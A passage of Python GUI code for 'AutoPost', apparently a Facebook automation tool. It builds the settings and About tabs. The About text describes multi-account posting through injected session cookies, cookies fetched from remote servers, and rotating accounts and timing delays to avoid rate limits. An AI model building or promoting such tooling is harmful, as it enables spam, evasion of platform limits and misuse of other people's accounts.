        text_container = ctk.CTkFrame(icon_text_row, fg_color="transparent")
        text_container.pack(side="left")
        ctk.CTkLabel(text_container, text="Close Browser After Shares",
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container, text="Automatically close browser when all shares complete",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.close_browser_var = ctk.BooleanVar(value=False)
        close_browser_toggle = ctk.CTkSwitch(close_browser_inner, text="",
                                            variable=self.close_browser_var,
                                            progress_color=COLORS["success"],
                                            button_color=COLORS["text_main"],
                                            button_hover_color=COLORS["success_hover"],
                                            state="normal" if Dars else "disabled")
        close_browser_toggle.pack(side="right")
        fast_mode_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"],
                                     corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        fast_mode_card.pack(fill="x", pady=(0, 20))
        section_header_fast = ctk.CTkFrame(fast_mode_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header_fast.pack(fill="x", padx=3, pady=3)
        header_inner_fast = ctk.CTkFrame(section_header_fast, fg_color="transparent")
        header_inner_fast.pack(fill="x", padx=25, pady=18)
        accent_bar_fast = ctk.CTkFrame(header_inner_fast, fg_color=COLORS["warning"], width=5, height=24, corner_radius=3)
        accent_bar_fast.pack(side="left", padx=(0, 12))
        header_text_fast = ctk.CTkFrame(header_inner_fast, fg_color="transparent")
        header_text_fast.pack(side="left")
        ctk.CTkLabel(header_text_fast, text="⚡ Performance Optimization",
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text_fast, text="Speed up automation by blocking unnecessary content",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame_fast = ctk.CTkFrame(fast_mode_card, fg_color="transparent")
        content_frame_fast.pack(fill="x", padx=25, pady=(15, 25))
        fast_mode_frame = ctk.CTkFrame(content_frame_fast, fg_color=COLORS["bg_card"],
                                      corner_radius=14, border_width=1, border_color=COLORS["border"])
        fast_mode_frame.pack(fill="x")
        fast_mode_inner = ctk.CTkFrame(fast_mode_frame, fg_color="transparent")
        fast_mode_inner.pack(fill="x", padx=20, pady=16)
        left_content_fast = ctk.CTkFrame(fast_mode_inner, fg_color="transparent")
        left_content_fast.pack(side="left", fill="x", expand=True)
        icon_text_row_fast = ctk.CTkFrame(left_content_fast, fg_color="transparent")
        icon_text_row_fast.pack(anchor="w")
        ctk.CTkLabel(icon_text_row_fast, text="🚀", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
        text_container_fast = ctk.CTkFrame(icon_text_row_fast, fg_color="transparent")
        text_container_fast.pack(side="left")
        ctk.CTkLabel(text_container_fast, text="Fast Mode (Block Media)",
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container_fast, text="Block images, videos, and CSS to speed up page loading",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        fast_mode_toggle = ctk.CTkSwitch(fast_mode_inner, text="",
                                        variable=self.fast_mode_var,
                                        progress_color=COLORS["warning"],
                                        button_color=COLORS["text_main"],
                                        button_hover_color=COLORS["warning_hover"],
                                        state="normal" if Dars else "disabled")
        fast_mode_toggle.pack(side="right")
        auto_click_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"], 
                                      corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        auto_click_card.pack(fill="x", pady=(0, 20))
        section_header_click = ctk.CTkFrame(auto_click_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header_click.pack(fill="x", padx=3, pady=3)
        header_inner_click = ctk.CTkFrame(section_header_click, fg_color="transparent")
        header_inner_click.pack(fill="x", padx=25, pady=18)
        accent_bar_click = ctk.CTkFrame(header_inner_click, fg_color=COLORS["accent"], width=5, height=24, corner_radius=3)
        accent_bar_click.pack(side="left", padx=(0, 12))
        header_text_click = ctk.CTkFrame(header_inner_click, fg_color="transparent")
        header_text_click.pack(side="left")
        ctk.CTkLabel(header_text_click, text="🖱️ Automation Control", 
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text_click, text="Control automatic button clicking behavior", 
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame_click = ctk.CTkFrame(auto_click_card, fg_color="transparent")
        content_frame_click.pack(fill="x", padx=25, pady=(15, 25))
        auto_click_frame = ctk.CTkFrame(content_frame_click, fg_color=COLORS["bg_card"], 
                                       corner_radius=14, border_width=1, border_color=COLORS["border"])
        auto_click_frame.pack(fill="x")
        auto_click_inner = ctk.CTkFrame(auto_click_frame, fg_color="transparent")
        auto_click_inner.pack(fill="x", padx=20, pady=16)
        left_content_click = ctk.CTkFrame(auto_click_inner, fg_color="transparent")
        left_content_click.pack(side="left", fill="x", expand=True)
        icon_text_row_click = ctk.CTkFrame(left_content_click, fg_color="transparent")
        icon_text_row_click.pack(anchor="w")
        ctk.CTkLabel(icon_text_row_click, text="🎯", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
        text_container_click = ctk.CTkFrame(icon_text_row_click, fg_color="transparent")
        text_container_click.pack(side="left")
        ctk.CTkLabel(text_container_click, text="Auto Click Share Button", 
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container_click, text="Automatically click the Share/Post button", 
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.auto_click_share_var = ctk.BooleanVar(value=True)
        auto_click_toggle = ctk.CTkSwitch(auto_click_inner, text="",
                                         variable=self.auto_click_share_var,
                                         progress_color=COLORS["accent"], 
                                         button_color=COLORS["text_main"],
                                         button_hover_color=COLORS["accent_hover"],
                                         state="normal" if Dars else "disabled")
        auto_click_toggle.pack(side="right")
        keep_on_error_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"], 
                                         corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        keep_on_error_card.pack(fill="x", pady=(0, 20))
        section_header_error = ctk.CTkFrame(keep_on_error_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header_error.pack(fill="x", padx=3, pady=3)
        header_inner_error = ctk.CTkFrame(section_header_error, fg_color="transparent")
        header_inner_error.pack(fill="x", padx=25, pady=18)
        accent_bar_error = ctk.CTkFrame(header_inner_error, fg_color=COLORS["danger"], width=5, height=24, corner_radius=3)
        accent_bar_error.pack(side="left", padx=(0, 12))
        header_text_error = ctk.CTkFrame(header_inner_error, fg_color="transparent")
        header_text_error.pack(side="left")
        ctk.CTkLabel(header_text_error, text="🐛 Debug Mode", 
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text_error, text="Keep browser open on errors for troubleshooting", 
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame_error = ctk.CTkFrame(keep_on_error_card, fg_color="transparent")
        content_frame_error.pack(fill="x", padx=25, pady=(15, 25))
        keep_error_frame = ctk.CTkFrame(content_frame_error, fg_color=COLORS["bg_card"], 
                                       corner_radius=14, border_width=1, border_color=COLORS["border"])
        keep_error_frame.pack(fill="x")
        keep_error_inner = ctk.CTkFrame(keep_error_frame, fg_color="transparent")
        keep_error_inner.pack(fill="x", padx=20, pady=16)
        left_content_error = ctk.CTkFrame(keep_error_inner, fg_color="transparent")
        left_content_error.pack(side="left", fill="x", expand=True)
        icon_text_row_error = ctk.CTkFrame(left_content_error, fg_color="transparent")
        icon_text_row_error.pack(anchor="w")
        ctk.CTkLabel(icon_text_row_error, text="🔍", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
        text_container_error = ctk.CTkFrame(icon_text_row_error, fg_color="transparent")
        text_container_error.pack(side="left")
        ctk.CTkLabel(text_container_error, text="Keep Browser Open on Error", 
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container_error, text="Don't close browser when crash/error occurs (useful for debugging)", 
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.keep_browser_on_error_var = ctk.BooleanVar(value=False)
        keep_error_toggle = ctk.CTkSwitch(keep_error_inner, text="",
                                         variable=self.keep_browser_on_error_var,
                                         progress_color=COLORS["danger"], 
                                         button_color=COLORS["text_main"],
                                         button_hover_color=COLORS["danger_hover"],
                                         state="normal" if Dars else "disabled")
        keep_error_toggle.pack(side="right")
        headless_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"],
                                    corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        headless_card.pack(fill="x", pady=(0, 20))
        section_header2 = ctk.CTkFrame(headless_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header2.pack(fill="x", padx=3, pady=3)
        header_inner2 = ctk.CTkFrame(section_header2, fg_color="transparent")
        header_inner2.pack(fill="x", padx=25, pady=18)
        accent_bar2 = ctk.CTkFrame(header_inner2, fg_color=COLORS["primary"], width=5, height=24, corner_radius=3)
        accent_bar2.pack(side="left", padx=(0, 12))
        header_text2 = ctk.CTkFrame(header_inner2, fg_color="transparent")
        header_text2.pack(side="left")
        ctk.CTkLabel(header_text2, text="👁️ Display Mode",
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text2, text="Show or hide browser window",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame2 = ctk.CTkFrame(headless_card, fg_color="transparent")
        content_frame2.pack(fill="x", padx=25, pady=(15, 25))
        headless_frame = ctk.CTkFrame(content_frame2, fg_color=COLORS["bg_card"],
                                     corner_radius=14, border_width=1, border_color=COLORS["border"])
        headless_frame.pack(fill="x")
        headless_inner = ctk.CTkFrame(headless_frame, fg_color="transparent")
        headless_inner.pack(fill="x", padx=20, pady=16)
        left_content2 = ctk.CTkFrame(headless_inner, fg_color="transparent")
        left_content2.pack(side="left", fill="x", expand=True)
        icon_text_row2 = ctk.CTkFrame(left_content2, fg_color="transparent")
        icon_text_row2.pack(anchor="w")
        ctk.CTkLabel(icon_text_row2, text="🕶️", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
        text_container2 = ctk.CTkFrame(icon_text_row2, fg_color="transparent")
        text_container2.pack(side="left")
        ctk.CTkLabel(text_container2, text="Headless Mode",
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container2, text="Run browser in background (True) or show window (False)",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.headless_var = ctk.BooleanVar(value=True)
        headless_toggle = ctk.CTkSwitch(headless_inner, text="",
                                       variable=self.headless_var,
                                       progress_color=COLORS["primary"],
                                       button_color=COLORS["text_main"],
                                       button_hover_color=COLORS["primary_light"],
                                       state="normal" if Dars else "disabled")
        headless_toggle.pack(side="right")
        workers_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"],
                                   corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        workers_card.pack(fill="x", pady=(0, 20))
        section_header3 = ctk.CTkFrame(workers_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header3.pack(fill="x", padx=3, pady=3)
        header_inner3 = ctk.CTkFrame(section_header3, fg_color="transparent")
        header_inner3.pack(fill="x", padx=25, pady=18)
        accent_bar3 = ctk.CTkFrame(header_inner3, fg_color=COLORS["accent"], width=5, height=24, corner_radius=3)
        accent_bar3.pack(side="left", padx=(0, 12))
        header_text3 = ctk.CTkFrame(header_inner3, fg_color="transparent")
        header_text3.pack(side="left")
        ctk.CTkLabel(header_text3, text="💻 Performance",
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text3, text="Control concurrent operations",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame3 = ctk.CTkFrame(workers_card, fg_color="transparent")
        content_frame3.pack(fill="x", padx=25, pady=(15, 25))
        workers_frame = ctk.CTkFrame(content_frame3, fg_color=COLORS["bg_card"],
                                    corner_radius=14, border_width=1, border_color=COLORS["border"])
        workers_frame.pack(fill="x")
        workers_inner = ctk.CTkFrame(workers_frame, fg_color="transparent")
        workers_inner.pack(fill="x", padx=20, pady=16)
        left_content3 = ctk.CTkFrame(workers_inner, fg_color="transparent")
        left_content3.pack(side="left", fill="x", expand=True)
        icon_text_row3 = ctk.CTkFrame(left_content3, fg_color="transparent")
        icon_text_row3.pack(anchor="w")
        ctk.CTkLabel(icon_text_row3, text="⚡", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
        text_container3 = ctk.CTkFrame(icon_text_row3, fg_color="transparent")
        text_container3.pack(side="left")
        ctk.CTkLabel(text_container3, text="Maximum Workers",
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container3, text="Number of concurrent browser instances (1-10)",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.max_workers_entry = ctk.CTkEntry(workers_inner, width=100, height=44,
                                             justify="center",
                                             fg_color=COLORS["bg_main"],
                                             border_color=COLORS["border_light"],
                                             border_width=2,
                                             corner_radius=12,
                                             font=("Segoe UI", 13, "bold"),
                                             state="normal" if Dars else "disabled")
        self.max_workers_entry.pack(side="right")
        self.max_workers_entry.insert(0, "10")
        info_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_card"], 
                                corner_radius=15, border_width=1, border_color=COLORS["border"])
        info_card.pack(fill="x", pady=(10, 0))
        info_content = ctk.CTkFrame(info_card, fg_color="transparent")
        info_content.pack(padx=25, pady=20)
        ctk.CTkLabel(info_content, text="ℹ️ Settings Information", 
                    font=("Segoe UI", 13, "bold"),
                    text_color=COLORS["accent"]).pack(anchor="w", pady=(0, 10))
        info_items = [
            "• Fast Mode: Blocks images, videos, and CSS files for faster page loading and reduced bandwidth",
            "• Auto Click Share: Automatically clicks the Share/Post button when enabled (default: True)",
            "• Keep Browser on Error: When enabled, browser stays open on crashes/errors for debugging",
            "• Close Browser: When enabled, browsers will close automatically after completing all shares",
            "• Headless Mode: True = invisible background operation, False = visible browser window",
            "• Max Workers: Higher values = faster but more resource intensive (recommended: 5-10)"
        ]
        for item in info_items:
            ctk.CTkLabel(info_content, text=item, 
                        font=("Segoe UI", 10),
                        text_color=COLORS["text_sub"],
                        anchor="w").pack(anchor="w", pady=2)
        save_button_frame = ctk.CTkFrame(settings_scroll, fg_color="transparent")
        save_button_frame.pack(fill="x", pady=(25, 10))
        save_btn = ctk.CTkButton(save_button_frame, 
                                text="💾 Save Settings", 
                                height=56,
                                fg_color=COLORS["success"],
                                hover_color=COLORS["success_hover"],
                                font=("Segoe UI", 14, "bold"),
                                corner_radius=16,
                                border_width=0,
                                command=self.save_settings_from_tab,
                                state="normal" if Dars else "disabled")
        save_btn.pack(fill="x", padx=5)
    def save_settings_from_tab(self):
        """Save all settings from the Settings tab"""
        try:
            close_browser = self.close_browser_var.get() if hasattr(self, 'close_browser_var') else False
            headless = self.headless_var.get() if hasattr(self, 'headless_var') else True
            auto_click = self.auto_click_share_var.get() if hasattr(self, 'auto_click_share_var') else True
            keep_on_error = self.keep_browser_on_error_var.get() if hasattr(self, 'keep_browser_on_error_var') else False
            fast_mode = self.fast_mode_var.get()
            max_workers = 10
            if hasattr(self, 'max_workers_entry'):
                try:
                    max_workers = int(self.max_workers_entry.get())
                    if max_workers < 1:
                        max_workers = 1
                    elif max_workers > 10:
                        max_workers = 10
                except:
                    max_workers = 10
            existing_settings = {}
            try:
                with open("pc_settings.json", "r") as f:
                    existing_settings = json.load(f)
            except:
                pass
            existing_settings.update({
                "close_browser_after_shares": close_browser,
                "headless_mode": headless,
                "auto_click_share": auto_click,
                "keep_browser_on_error": keep_on_error,
                "fast_mode": fast_mode,
                "max_workers": max_workers
            })
            with open("pc_settings.json", "w") as f:
                json.dump(existing_settings, f, indent=2)
            messagebox.showinfo("Settings Saved", "All settings have been saved successfully!")
        except Exception as e:
            messagebox.showerror("Save Error", f"Failed to save settings:\n{str(e)}")
    def setup_about(self):
        """Setup the About tab with comprehensive tool information"""
        self.tab_about.grid_columnconfigure(0, weight=1)
        self.tab_about.grid_rowconfigure(0, weight=1)
        about_scroll = ctk.CTkScrollableFrame(self.tab_about, fg_color="transparent")
        about_scroll.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)
        hero_section = ctk.CTkFrame(about_scroll, fg_color=COLORS["bg_elevated"], 
                                    corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        hero_section.pack(fill="x", pady=(0, 20))
        hero_content = ctk.CTkFrame(hero_section, fg_color="transparent")
        hero_content.pack(fill="x", padx=40, pady=40)
        logo_title_frame = ctk.CTkFrame(hero_content, fg_color="transparent")
        logo_title_frame.pack(anchor="center", pady=(0, 20))
        logo_bg = ctk.CTkFrame(logo_title_frame, fg_color=COLORS["primary_bg"], 
                              corner_radius=20, width=80, height=80,
                              border_width=3, border_color=COLORS["primary"])
        logo_bg.pack()
        logo_bg.pack_propagate(False)
        ctk.CTkLabel(logo_bg, text="⚡", font=("Segoe UI Emoji", 48)).pack(expand=True)
        ctk.CTkLabel(hero_content, text="AUTOPOST", 
                    font=("Segoe UI", 32, "bold"),
                    text_color=COLORS["text_main"]).pack(pady=(10, 5))
        version_frame = ctk.CTkFrame(hero_content, fg_color=COLORS["primary_bg"], 
                                    corner_radius=10, border_width=1, border_color=COLORS["primary"])
        version_frame.pack()
        ctk.CTkLabel(version_frame, text=f"Version {__version__} - Professional Edition", 
                    font=("Segoe UI", 11, "bold"),
                    text_color=COLORS["primary_light"]).pack(padx=20, pady=8)
        ctk.CTkLabel(hero_content, text="Advanced Facebook Automation Suite", 
                    font=("Segoe UI", 14),
                    text_color=COLORS["text_sub"]).pack(pady=(15, 0))
        self._create_about_section(about_scroll, "📖 What is AutoPost?",
            "AutoPost is a professional automation tool designed to streamline Facebook sharing operations. "
            "It enables efficient multi-account management, automated posting, and session persistence for "
            "seamless workflow automation. Built with modern technologies including Playwright for browser "
            "automation and CustomTkinter for a premium user interface.")
        features_card = self._create_section_card(about_scroll, "✨ Key Features")
        features_content = ctk.CTkFrame(features_card, fg_color="transparent")
        features_content.pack(fill="x", padx=30, pady=(0, 25))
        features = [
            ("🚀", "Multi-Account Automation", "Process multiple Facebook accounts simultaneously with intelligent thread management"),
            ("💾", "Session Persistence", "Save and reuse login sessions to avoid repeated authentication"),
            ("⚡", "Fast Mode", "Block media resources for faster page loading and reduced bandwidth"),
            ("☁️", "Cloud Sync", "Fetch cookie data from remote servers for centralized management"),
            ("📱", "ADB Integration", "Control Android devices wirelessly for mobile automation"),
            ("🌐", "USB Tethering", "Share PC internet connection with mobile devices via USB"),
            ("📊", "Real-time Analytics", "Monitor shares, failures, and performance metrics live"),
            ("🔄", "Auto-Update", "Automatic version checking and seamless updates")
        ]
        for icon, title, desc in features:
            self._create_feature_item(features_content, icon, title, desc)
        howto_card = self._create_section_card(about_scroll, "🎯 How to Use")
        howto_content = ctk.CTkFrame(howto_card, fg_color="transparent")
        howto_content.pack(fill="x", padx=30, pady=(0, 25))
        steps = [
            ("1", "Prepare Cookies", "Obtain Facebook cookies in Netscape format or use Cloud Sync to fetch from server"),
            ("2", "Configure Links", "Add target URLs and optional caption files in the Task Queue section"),
            ("3", "Set Parameters", "Adjust pre/post action delays and enable Fast Mode if needed"),
            ("4", "Start Automation", "Click 'Start Engine' to begin processing accounts"),
            ("5", "Monitor Progress", "Watch real-time logs and analytics in the System Logs tab")
        ]
        for num, title, desc in steps:
            self._create_step_item(howto_content, num, title, desc)
        tabs_card = self._create_section_card(about_scroll, "📑 Understanding the Tabs")
        tabs_content = ctk.CTkFrame(tabs_card, fg_color="transparent")
        tabs_content.pack(fill="x", padx=30, pady=(0, 25))
        tabs_info = [
            ("Dashboard", "🎛️", "Main control center for configuration and automation management. "
             "Configure cookies, links, delays, and control automation execution."),
            ("System Logs", "📋", "Real-time activity monitor showing all automation events. "
             "Track successful shares, failures, and account processing status with detailed timestamps."),
            ("Saved Profiles", "💾", "Repository of successfully authenticated accounts. "
             "These profiles contain saved browser sessions that can be reused without re-authentication. "
             "Enable 'Use All Saved Profiles' toggle to run automation using only saved sessions."),
            ("Expired Cookies", "❌", "List of accounts with invalid or expired authentication. "
             "These accounts failed to authenticate and need fresh cookies. "
             "Review and update these accounts before retrying automation."),
            ("About", "ℹ️", "Comprehensive guide and documentation for the tool. "
             "Learn about features, usage instructions, and best practices.")
        ]
        for tab_name, icon, description in tabs_info:
            self._create_tab_info_item(tabs_content, tab_name, icon, description)
        saved_card = self._create_section_card(about_scroll, "💾 Saved Profiles Explained")
        saved_content = ctk.CTkFrame(saved_card, fg_color="transparent")
        saved_content.pack(fill="x", padx=30, pady=(0, 25))
        ctk.CTkLabel(saved_content, 
                    text="Saved Profiles are persistent browser sessions stored locally. When you successfully "
                         "authenticate an account, the browser session is saved to the 'profiles' folder. "
                         "This allows you to:",
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"],
                    wraplength=700,
                    justify="left").pack(anchor="w", pady=(0, 15))
        saved_benefits = [
            "Skip cookie injection on subsequent runs",
            "Maintain login state across automation sessions",
            "Reduce authentication failures and rate limiting",
            "Speed up automation by reusing existing sessions",
            "Use 'Use All Saved Profiles' toggle to run without cookie files"
        ]
        for benefit in saved_benefits:
            benefit_row = ctk.CTkFrame(saved_content, fg_color="transparent")
            benefit_row.pack(fill="x", pady=3)
            ctk.CTkLabel(benefit_row, text="✓", font=("Segoe UI", 14, "bold"),
                        text_color=COLORS["success"]).pack(side="left", padx=(0, 10))
            ctk.CTkLabel(benefit_row, text=benefit, font=("Segoe UI", 11),
                        text_color=COLORS["text_main"], anchor="w").pack(side="left", fill="x")
        expired_card = self._create_section_card(about_scroll, "❌ Expired Cookies Explained")
        expired_content = ctk.CTkFrame(expired_card, fg_color="transparent")
        expired_content.pack(fill="x", padx=30, pady=(0, 25))
        ctk.CTkLabel(expired_content,
                    text="Expired Cookies are accounts that failed authentication during automation. "
                         "This happens when:",
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"],
                    wraplength=700,
                    justify="left").pack(anchor="w", pady=(0, 15))
        expired_reasons = [
            "Cookie data is outdated or invalid",
            "Account password was changed",
            "Facebook detected suspicious activity",
            "Session expired due to inactivity",
            "Account was logged out from another device"
        ]
        for reason in expired_reasons:
            reason_row = ctk.CTkFrame(expired_content, fg_color="transparent")
            reason_row.pack(fill="x", pady=3)
            ctk.CTkLabel(reason_row, text="•", font=("Segoe UI", 16, "bold"),
                        text_color=COLORS["danger"]).pack(side="left", padx=(0, 10))
            ctk.CTkLabel(reason_row, text=reason, font=("Segoe UI", 11),
                        text_color=COLORS["text_main"], anchor="w").pack(side="left", fill="x")
        ctk.CTkLabel(expired_content,
                    text="\nTo fix expired cookies: Obtain fresh cookies from the affected accounts and "
                         "update your cookie file. The tool automatically detects and lists expired accounts "
                         "for easy identification.",
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"],
                    wraplength=700,
                    justify="left").pack(anchor="w", pady=(15, 0))
        practices_card = self._create_section_card(about_scroll, "💡 Best Practices")
        practices_content = ctk.CTkFrame(practices_card, fg_color="transparent")
        practices_content.pack(fill="x", padx=30, pady=(0, 25))
        practices = [
            ("⏱️", "Use Delays Wisely", "Set appropriate pre/post action delays (10-15 seconds) to avoid rate limiting"),
            ("🔄", "Rotate Accounts", "Don't overuse single accounts. Distribute shares across multiple profiles"),
            ("💾", "Backup Profiles", "Regularly backup your 'profiles' folder to preserve saved sessions"),
            ("📊", "Monitor Logs", "Keep an eye on System Logs to catch issues early"),
            ("🔒", "Secure Cookies", "Store cookie files securely and never share them publicly"),
            ("⚡", "Use Fast Mode", "Enable Fast Mode for faster execution and reduced bandwidth usage")
        ]
        for icon, title, desc in practices:
            self._create_feature_item(practices_content, icon, title, desc)
        tech_card = self._create_section_card(about_scroll, "⚙️ Technical Information")
        tech_content = ctk.CTkFrame(tech_card, fg_color="transparent")
        tech_content.pack(fill="x", padx=30, pady=(0, 25))
        tech_specs = [
            ("Framework", "CustomTkinter (Modern UI)"),
            ("Automation", "Playwright (Chromium)"),
            ("Threading", "Multi-threaded (up to 10 concurrent)"),
            ("Storage", "Local profile persistence"),
            ("Platform", "Windows, Linux, macOS"),
            ("Python", "3.7+")
        ]
        for label, value in tech_specs:
            tech_row = ctk.CTkFrame(tech_content, fg_color=COLORS["bg_card"], 
                                   corner_radius=10, border_width=1, border_color=COLORS["border"])
            tech_row.pack(fill="x", pady=5)
            tech_inner = ctk.CTkFrame(tech_row, fg_color="transparent")
            tech_inner.pack(fill="x", padx=20, pady=12)
            ctk.CTkLabel(tech_inner, text=label, font=("Segoe UI", 11, "bold"),
                        text_color=COLORS["text_sub"]).pack(side="left")
            ctk.CTkLabel(tech_inner, text=value, font=("Segoe UI", 11),
                        text_color=COLORS["text_main"]).pack(side="right")
        footer = ctk.CTkFrame(about_scroll, fg_color=COLORS["bg_card"], 
                             corner_radius=15, border_width=1, border_color=COLORS["border"])
        footer.pack(fill="x", pady=(10, 0))
        footer_content = ctk.CTkFrame(footer, fg_color="transparent")
        footer_content.pack(padx=30, pady=25)
        ctk.CTkLabel(footer_content, text="⚡ AUTOPOST", 
                    font=("Segoe UI", 14, "bold"),
                    text_color=COLORS["primary"]).pack()
        
        dev_credit_container = ctk.CTkFrame(footer_content, fg_color=COLORS["bg_elevated"], 
                                           corner_radius=15, border_width=2, border_color=COLORS["primary"])
        dev_credit_container.pack(pady=(15, 0))
        
        dev_credit_inner = ctk.CTkFrame(dev_credit_container, fg_color="transparent")
        dev_credit_inner.pack(padx=30, pady=20)
        
        credit_row = ctk.CTkFrame(dev_credit_inner, fg_color="transparent")
        credit_row.pack()
        
        ctk.CTkLabel(credit_row, text="Developed With Love", 
                    font=("Segoe UI", 14, "bold"),
                    text_color=COLORS["text_main"]).pack(side="left", padx=(0, 8))
        
        ctk.CTkLabel(credit_row, text="❤️", 
                    font=("Segoe UI Emoji", 20),
                    text_color="#FF6B9D").pack(side="left", padx=(0, 8))
        
        ctk.CTkLabel(credit_row, text="By", 
                    font=("Segoe UI", 14, "bold"),
                    text_color=COLORS["text_main"]).pack(side="left", padx=(0, 8))
        
        dars_highlight = ctk.CTkFrame(credit_row, fg_color=COLORS["primary"], 
                                     corner_radius=10, border_width=0)
        dars_highlight.pack(side="left")
        ctk.CTkLabel(dars_highlight, text="Dars", 
                    font=("Segoe UI", 16, "bold"),
                    text_color=COLORS["text_main"]).pack(padx=20, pady=8)
        
        dev_frame = ctk.CTkFrame(footer_content, fg_color=COLORS["bg_elevated"], 
                                corner_radius=12, border_width=1, border_color=COLORS["border"])
        dev_frame.pack(pady=(10, 0))
        dev_content = ctk.CTkFrame(dev_frame, fg_color="transparent")
        dev_content.pack(padx=25, pady=15)
        dev_text_frame = ctk.CTkFrame(dev_content, fg_color="transparent")
        dev_text_frame.pack()
        ctk.CTkLabel(dev_text_frame, text="Developed with ", 
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"]).pack(side="left")
        self.heart_label = ctk.CTkLabel(dev_text_frame, text="❤️", 
                                       font=("Segoe UI Emoji", 14),
                                       text_color="#FF6B9D")
        self.heart_label.pack(side="left", padx=3)
        ctk.CTkLabel(dev_text_frame, text=" by ", 
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"]).pack(side="left")
        dev_name_bg = ctk.CTkFrame(dev_text_frame, fg_color=COLORS["primary_bg"], 
                                  corner_radius=6, border_width=1, border_color=COLORS["primary"])
        dev_name_bg.pack(side="left", padx=(3, 0))
        ctk.CTkLabel(dev_name_bg, text="Dars", 
                    font=("Segoe UI", 11, "bold"),
                    text_color=COLORS["primary_light"]).pack(padx=12, pady=4)
        self.animate_heart()
    def animate_heart(self):
        """Animate the heart emoji with pulsing effect"""
        if not hasattr(self, 'heart_label'):
            return
        hearts = ["❤️", "💖", "💗", "💓", "💕", "💗", "💖"]
        if not hasattr(self, 'heart_index'):
            self.heart_index = 0
        try:
            self.heart_label.configure(text=hearts[self.heart_index])
            self.heart_index = (self.heart_index + 1) % len(hearts)
            self.after(500, self.animate_heart)
        except:
            pass
    def _create_about_section(self, parent, title, description):
        """Helper to create a simple about section"""
        card = ctk.CTkFrame(parent, fg_color=COLORS["bg_elevated"], 
                           corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        card.pack(fill="x", pady=(0, 20))
        content = ctk.CTkFrame(card, fg_color="transparent")
        content.pack(fill="x", padx=30, pady=25)
        title_frame = ctk.CTkFrame(content, fg_color="transparent")
        title_frame.pack(fill="x", pady=(0, 15))
        accent = ctk.CTkFrame(title_frame, fg_color=COLORS["primary"], width=5, height=24, corner_radius=3)
        accent.pack(side="left", padx=(0, 12))
        ctk.CTkLabel(title_frame, text=title, font=("Segoe UI", 16, "bold"),
                    text_color=COLORS["text_main"]).pack(side="left")
        ctk.CTkLabel(content, text=description, font=("Segoe UI", 11),
                    text_color=COLORS["text_sub"], wraplength=700, justify="left").pack(anchor="w")
    def _create_section_card(self, parent, title):
        """Helper to create a section card with title"""
        card = ctk.CTkFrame(parent, fg_color=COLORS["bg_elevated"], 
